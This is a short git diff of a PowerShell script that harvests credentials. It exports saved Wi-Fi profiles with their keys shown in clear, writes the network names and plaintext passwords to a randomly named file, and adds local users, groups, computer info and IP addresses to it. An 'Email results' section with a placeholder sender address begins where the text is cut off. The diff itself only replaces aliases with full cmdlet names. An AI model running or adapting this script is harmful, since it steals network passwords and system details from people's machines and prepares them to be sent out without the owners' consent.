@@ -16,7 +16,7 @@ $filename = '23rtg4t.txt'
 
 # Get Wi-Fi Known Networks OutFile $filename
 netsh wlan export profile key=clear
-dir *.xml |% {
+Get-ChildItem *.xml |ForEach-Object {
 $xml=[xml] (get-content $_)
 $a= "*******************************`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
 Out-File $filename -Append -InputObject $a
@@ -27,6 +27,7 @@ Get-LocalUser | Out-File -Append $filename
 Get-LocalGroup | Out-File -Append $filename
 Get-Computerinfo | Out-File -Append $filename
 Get-NetIPAddress | Out-File -Append $filename
+
 
 # Email results
 $FROM = "<SENDER EMAIL ADDRESS>"
